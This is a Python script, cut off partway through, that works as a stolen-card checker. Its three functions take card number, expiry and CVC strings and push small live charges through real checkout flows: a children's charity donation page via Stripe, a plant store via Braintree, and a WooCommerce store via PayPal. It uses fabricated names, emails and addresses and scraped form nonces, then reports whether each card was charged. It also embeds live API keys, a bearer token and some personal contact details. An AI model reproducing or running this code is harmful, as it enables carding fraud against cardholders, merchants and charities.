import requests
import re
import random
import time
import string
import base64
from user_agent import generate_user_agent
from bs4 import BeautifulSoup

def Tele3(cc):
    import requests
    from getuseragent import UserAgent
    user_agent = UserAgent('windows').Random()
    import uuid
    import random
    import os
    from bs4 import BeautifulSoup
    from faker import Faker

    rs = requests.session()
    cc = cc.strip()
    parts = re.split(r'[ |/]', cc)
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]
    yy=yy[-2:]
    def escape_markdown(text):
        return text.replace(".", "\.").replace("_", "\_").replace("*", "\*").replace("[", "\[").replace("]", "\]").replace("(", "\(").replace(")", "\)").replace("~", "\~").replace("`", "\`").replace(">", "\>").replace("#", "\#").replace("+", "\+").replace("-", "\-").replace("=", "\=").replace("|", "\|")

    print(n, mm, yy, cvc)
    faker = Faker('en_US')
    guid = str(uuid.uuid4())
    muid = str(uuid.uuid4())
    sid = str(uuid.uuid4())
    fakeName = faker.name()
    fakeEmail = f"{faker.first_name().lower()}{random.randint(100000000, 999999999)}@gmail.com"
    fakeZip = faker.zipcode()

    se = requests.Session()
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    }

        # Fetch page to get necessary form values
    html = se.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', headers=headers)
    charitable_session = se.cookies.get('charitable_session')
    soup = BeautifulSoup(html.text, 'html.parser')
    charitable_form_id = soup.find('input', {'name': 'charitable_form_id'})['value']
    charitable_donation_nonce = soup.find('input', {'name': '_charitable_donation_nonce'})['value']

    # Prepare data for Stripe API
    data = f'type=card&billing_details[name]={fakeName}&billing_details[email]={fakeEmail}&billing_details[address][city]=CONCORD&billing_details[address][country]=AU&billing_details[address][line1]=30+Sydney+Street&billing_details[address][postal_code]={fakeZip}&billing_details[address][state]=NSW&billing_details[phone]=0212+121+212&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F1cb064bd1e%3B+stripe-js-v3%2F1cb064bd1e%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=1321663&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
    response = se.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
        id = response.json()['id']
    except:id=''

    # Make donation request with stripe payment method
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://needhelped.com',
        'priority': 'u=1, i',
        'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'charitable_form_id': charitable_form_id,
        f'{charitable_form_id}': '',
        '_charitable_donation_nonce': charitable_donation_nonce,
        '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
        'campaign_id': '1164',
        'description': 'Poor Children Donation Support',
        'ID': '0',
        'donation_amount': 'custom',
        'custom_donation_amount': '1.00',
        'first_name': 'jyrgtfhyy',
        'last_name': 'tbrfgxcvb',
        'email': fakeEmail,
        'address': '30 Sydney Street',
        'address_2': '',
        'city': 'CONCORD',
        'state': 'NSW',
        'postcode': '2137',
        'country': 'AU',
        'phone': '0212 121 212',
        'gateway': 'stripe',
        'stripe_payment_method': id,
        'action': 'make_donation',
        'form_action': 'make_donation',
    }

    response = se.post('https://needhelped.com/wp-admin/admin-ajax.php', headers=headers, data=data)
    data = response.json()

    # Send final response after processing
    if data.get('success') is True:
        return('charge')
    else:
        error = data['errors'][0]
        return({escape_markdown(error)})

def Tele1(cc):
    import requests
    from getuseragent import UserAgent
    user_agent = UserAgent('windows').Random()

    rs = requests.session()
    cc = cc.strip()
    parts = re.split(r'[ |/]', cc)
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]
   

    print(n, mm, yy, cvc)

    time.sleep(15)        

	
	
    head1={
    'user-agent':user_agent,
    'Pragma':'no-cache',
    'Accept':'*/*',
    }
    response1 = requests.get('https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US',headers=head1).json()
    for x in response1['results']:
        name=x['name']['first']
        second=x['name']['last']
    email=(name+second+'@outlook.com').lower()
    fullname=name+' '+second

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8,tr;q=0.7',
        'authorization': 'Bearer production_7bbkkybf_h459dp5mgcbywsdx',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://assets.braintreegateway.com',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '70637d54-c496-4182-9d59-6f3f3ded1990',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

    tok=response.json()['data']['tokenizeCreditCard']['token']

    cookies = {
        'tt_cart': 'e0dcd03b1bf39a135c4f6457f4259eec',
        '_clck': '1xao46j%7C2%7Cftf%7C0%7C1871',
        '_ga': 'GA1.2.1080026780.1739572497',
        '_gid': 'GA1.2.275149073.1739572497',
        '_gat_gtag_UA_28437709_1': '1',
        '_clsk': '16osthj%7C1739572498182%7C1%7C1%7Cf.clarity.ms%2Fcollect',
        '_ga_MHLE3MRB4W': 'GS1.1.1739572496.1.1.1739572499.57.0.0',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8,tr;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://toptropicals.com',
        'priority': 'u=1, i',
        'referer': 'https://toptropicals.com/cgi-bin/store/dzcart.cgi',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
        # 'cookie': 'tt_cart=e0dcd03b1bf39a135c4f6457f4259eec; _clck=1xao46j%7C2%7Cftf%7C0%7C1871; _ga=GA1.2.1080026780.1739572497; _gid=GA1.2.275149073.1739572497; _gat_gtag_UA_28437709_1=1; _clsk=16osthj%7C1739572498182%7C1%7C1%7Cf.clarity.ms%2Fcollect; _ga_MHLE3MRB4W=GS1.1.1739572496.1.1.1739572499.57.0.0',
    }

    data = {
        'paymentMethodNonce': tok,
        'cartTotalPrice': '4.95',
        'cartId': 'e0dcd03b1bf39a135c4f6457f4259eec',
        'orderId': '2138355',
        'comments': '',
        'address_company': '',
        'address_name': 'dave ali',
        'address_country': 'USA',
        'address_city': 'North Reading',
        'address_postalCode': '10080',
        'address_streetAddress': '125 St Nicholas Dr',
        'address_streetAddress_2nd': '',
        'address_state': 'NY',
        'phone': '02018438700',
        'mobile': '',
        'email': email,
        'address_company1': '',
        'address_name1': '',
        'address_country1': 'USA',
        'address_city1': '',
        'address_postalCode1': '10080',
        'address_streetAddress1': '',
        'address_streetAddress_2nd1': '',
        'address_state1': 'NY',
        'phone1': '',
        'discount_code': '',
        'discount_code_email': '',
        'gift_code': '',
        'gift_code_value': '0.00',
        'shipping_option': '39',
        'local_pickup_option': '0',
        'ttcartflag': '1',
        'orderURL': 'https://toptropicals.com/cgi-bin/store/dzcart.cgi?return=toptropicals.com%2Fstore%2Fitem%2F1255.htm&shipping_option=39&local_pickup_option=0&function=FromCart&time=1739572499&store=tt&no_template=0&return=toptropicals.com%2Fstore%2Fitem%2F1255.htm&confirm=&discount_code=&discount_code_email=&gift_code=&gift_code_value=0.00&name=dave+ali&company=&address=125+St+Nicholas+Dr&address_2nd=&city=North+Reading&state=NY&zip=10080&country=USA&phone=02018438700&mobile=&email=ddfmotor3%40gmail.com&comments=&name1=&company1=&address1=&address_2nd_1=&city1=&state1=NY&zip1=10080&country1=USA&phone1=&id=e0dcd03b1bf39a135c4f6457f4259eec&Order=1',
    }

    response = requests.post('https://toptropicals.com/cgi-bin/store/process_payment.cgi', cookies=cookies, headers=headers, data=data)
    if '<OrderProcessed>0' in response.text:
        rez=(response.text.split('<PaymentStatusText>')[1].split('<')[0])
        return rez
    if 'Approved' in response.text:
        return 'charge'

    else:
        return response.text


import requests
import re
import string
def Tele(ccx):
    import requests
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Stohy
        yy = yy.split("20")[1]
    r = requests.session()
    import requests
    


    import requests
    import re
    import base64
    import string
    import time
    import json
    import user_agent
    user = user_agent.generate_user_agent()
    r = requests.session()
    
    string, user_agent, time
    user = user_agent.generate_user_agent()
    r = requests.session()
    
    from requests_toolbelt.multipart.encoder import MultipartEncoder
    
    import random
    
    def generate_full_name():
        first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                       "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
                       "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
                       "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
                       "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
                       "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
                       "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
                       "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
                       "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
                       "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
        
        last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                       "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
                       "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
                       "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
                       "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
                       "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
                       "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
                       "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
        
        full_name = random.choice(first_names) + " " + random.choice(last_names)
        first_name, last_name = full_name.split()
        return first_name, last_name
    def generate_address():
        cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
        states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
        streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
        zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
    
        city = random.choice(cities)
        state = states[cities.index(city)]
        street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
        zip_code = zip_codes[states.index(state)]
    
        return city, state, street_address, zip_code
    
    # Testing the library:
    first_name, last_name = generate_full_name()
    city, state, street_address, zip_code = generate_address()
    def generate_random_account():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@gmail.com"
    acc = (generate_random_account())
    def num():
        number = ''.join(random.choices(string.digits, k=7))
        return f"303{number}"
    num = (num())    
    files = {
        'quantity': (None, '1'),
    'add-to-cart': (None, '4451'),
    }
    multipart_data = MultipartEncoder(fields=files)
    headers = {
        'authority': 'switchupcb.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': multipart_data.content_type,
    'origin': 'https://switchupcb.com',
    'referer': 'https://switchupcb.com/shop/i-buy/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
    response = r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data)
    headers = {
        'authority': 'switchupcb.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'referer': 'https://switchupcb.com/cart/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

    
    response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers)
    
    
    sec = (re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1))
    
    
    nonce = (re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1))
    
    
    check = (re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1))
    
    
    create = (re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1))
    
    
    
    
    headers = {
    'authority': 'switchupcb.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://switchupcb.com',
    'referer': 'https://switchupcb.com/checkout/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
}
    
    params = {
        'wc-ajax': 'update_order_review',
    }
    data = 'security={sec}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fswitchupcb.com%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3DHouda%26billing_last_name%3DAlaa%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3DNew%2520York%26billing_address_2%3D%26billing_city%3DNew%2520York%26billing_state%3DNY%26billing_postcode%3D10080%26billing_phone%3D3008796324%26billing_email%3Dtapt1744%2540gmail.com%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
    
    response = r.post('https://switchupcb.com/', params=params,  headers=headers, data=data)
    
    
    
    
    
    
    
    headers = {
        'authority': 'switchupcb.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://switchupcb.com',
        'pragma': 'no-cache',
        'referer': 'https://switchupcb.com/checkout/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
    }
    
    params = {
        'wc-ajax': 'ppc-create-order',
    }
    
    json_data = {
        'nonce': create,
        'payer': None,
        'bn_code': 'Woo_PPCP',
        'context': 'checkout',
        'order_id': '0',
        'payment_method': 'ppcp-gateway',
        'funding_source': 'card',
        'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
        'createaccount': False,
        'save_payment_method': False,
    }
    
    response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data)
    
    
    
    
    
        
    id = response.json()['data']['id']
    pcp = response.json()['data']['custom_id']
    
    
    
    import random
    import string
    
    
    lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    
    lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    
    lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
    
    
    
    random_chars_button = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
    
    
    session_id = f'uid_{lol1}_{lol3}'
    
    
    button_session_id = f'uid_{lol2}_{lol3}'
    
    
    headers = {
        'authority': 'www.paypal.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6', 
    'referer': 'https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_378e07784c_mtc6nde6ndk&buttonSize=large&customerId=&clientID=AY7TjJuH5RtvCuEf2ZgEVKs3quu69UggsCg29lkrb3kvsdGcX2ljKidYXXHPParmnymd9JacfRh0hzEp&clientMetadataID=uid_b5c925a7b4_mtc6nde6ndk&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=venmo&enableFunding.1=paylater&env=production&experiment.enableVenmo=true&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwibWFlc3RybyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGluZXJzIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJjdXAiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjpmYWxzZX0sInZlbm1vIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZX0sIml0YXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiY3JlZGl0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImFwcGxlcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvYmFuY2FyaW8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfSwibXVsdGliYW5jbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzYXRpc3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYWlkeSI6eyJlbGlnaWJsZSI6ZmFsc2V9fQ&intent=capture&locale.country=EG&locale.lang=ar&hasShippingCallback=false&pageType=checkout&platform=mobile&renderedButtons.0=paypal&renderedButtons.1=card&sessionID=uid_b5c925a7b4_mtc6nde6ndk&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19&sdkVersion=5.0.465&storageID=uid_ba45630ca6_mtc6nde6ndk&supportedNativeBrowser=true&supportsPopups=true&vault=false',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
    
    params = {
        'sessionID': session_id,
    'buttonSessionID': button_session_id,
    'locale.x': 'ar_EG',
    'commit': 'true',
    'hasShippingCallback': 'false',
    'env': 'production',
    'country.x': 'EG',
    'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
    'disable-card': '',
    'token': id,
}
    
    response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers)
    
    
    
    
    import requests

    import random
    import string
    
    def generate_random_code():
        characters = string.ascii_letters + string.digits
        code = ''.join(random.choices(characters, k=17))
        return code
    
    random_code = generate_random_code()


    headers = {
        'authority': 'my.tinyinstaller.top',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/json',
    'origin': 'https://my.tinyinstaller.top',
    'referer': 'https://my.tinyinstaller.top/checkout/',
